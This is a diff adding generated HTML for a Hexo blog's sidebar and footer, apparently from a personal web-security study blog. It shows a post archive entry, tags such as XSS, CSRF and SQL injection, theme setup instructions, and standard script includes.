+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/08/29/MySQL用户管理：添加用户、授权、删除用户/" >MySQL用户管理：添加用户、授权、删除用户</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="玩"><span class="iconfont-archer">&#xe606;</span>玩</span>
+    
+        <span class="sidebar-tag-name" data-tags="XSS学习"><span class="iconfont-archer">&#xe606;</span>XSS学习</span>
+    
+        <span class="sidebar-tag-name" data-tags="CSRF"><span class="iconfont-archer">&#xe606;</span>CSRF</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQL注入"><span class="iconfont-archer">&#xe606;</span>SQL注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="日志分析"><span class="iconfont-archer">&#xe606;</span>日志分析</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="XSS学习"><span class="iconfont-archer">&#xe60a;</span>XSS学习</span>
+    
+        <span class="sidebar-category-name" data-categories="Web安全"><span class="iconfont-archer">&#xe60a;</span>Web安全</span>
+    
+        <span class="sidebar-category-name" data-categories="小白成长学习计划"><span class="iconfont-archer">&#xe60a;</span>小白成长学习计划</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "jax"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
